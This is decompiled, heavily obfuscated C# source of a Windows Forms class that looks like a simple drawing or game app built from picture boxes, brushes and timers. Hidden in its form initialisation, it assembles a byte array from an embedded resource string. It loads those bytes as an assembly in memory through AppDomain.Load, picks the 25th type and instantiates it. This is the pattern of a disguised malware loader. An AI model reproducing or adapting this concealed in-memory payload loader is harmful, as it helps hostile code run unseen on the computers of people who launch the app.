				case 21u:
					num = ((int)num2 * -1172901436) ^ 0x7646AA2F;
					continue;
				case 20u:
					num = ((int)num2 * -1285799547) ^ 0x358E3E0F;
					continue;
				case 19u:
					num = ((int)num2 * -1911509278) ^ -421970808;
					continue;
				case 18u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = (int)(num2 * 1184477898) ^ -794181405;
					continue;
				case 17u:
					Form1.smethod_61((Control)(object)button2, "button2");
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -2063242386) ^ 0x70965D70;
					continue;
				case 16u:
					num = ((int)num2 * -18556715) ^ 0x394FB703;
					continue;
				case 15u:
					string_ = Form1.smethod_34(string_, Veet.Zr);
					array = new byte[22528];
					num = ((int)num2 * -1750014332) ^ 0x4BB494F9;
					continue;
				case 14u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = (int)(num2 * 410010614) ^ -1983979126;
					continue;
				case 13u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = (int)(num2 * 389341831) ^ -1155321753;
					continue;
				case 12u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = (int)(num2 * 2112365590) ^ -441773153;
					continue;
				case 11u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = (int)(num2 * 1383037589) ^ -89490174;
					continue;
				case 10u:
					num = (int)((num2 * 906869504) ^ 0x5D9C9B8C);
					continue;
				case 9u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = (int)(num2 * 938457474) ^ -1505023332;
					continue;
				case 8u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = (int)((num2 * 1879728561) ^ 0x4CA4E8CC);
					continue;
				case 7u:
					CharArray(array, string.Empty);
					num = ((int)num2 * -485875895) ^ 0x3FC10882;
					continue;
				case 6u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = (int)(num2 * 1655999084) ^ -399149290;
					continue;
				case 5u:
					num = (int)(num2 * 282996356) ^ -1910891913;
					continue;
				case 4u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = ((int)num2 * -1590212550) ^ 0x17A50779;
					continue;
				case 3u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)(num2 * 23958484) ^ -1094316840;
					continue;
				case 2u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = (int)((num2 * 567481403) ^ 0x4FB5930A);
					continue;
				case 1u:
					label1 = Form1.smethod_57();
					num = ((int)num2 * -279642401) ^ 0x22687603;
					continue;
				case 0u:
					Form1.smethod_70(ComMember, object_);
					num = (int)((num2 * 2128296492) ^ 0x1B1EC239);
					continue;
				default:
					return;
				case 48u:
					break;
				case 89u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		while (true)
		{
			int num = 2096063436;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x376A7B47u) % 4u)
				{
				case 3u:
				{
					Assembly q = ContextAdd(Level);
					PerformTable(q);
					num = ((int)num2 * -3794413) ^ -1130953641;
					continue;
				}
				case 1u:
					num = ((int)num2 * -1457073190) ^ 0x7EA9C59F;
					continue;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = 1628567866;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x21A9BBDBu) % 4u)
				{
				case 2u:
					num = ((int)num2 * -662983148) ^ -1127445849;
					continue;
				case 1u:
					result = Form1.smethod_94(Form1.smethod_93(), Position);
					num = ((int)num2 * -885939346) ^ 0x4D6E7BDF;
					continue;
				case 3u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
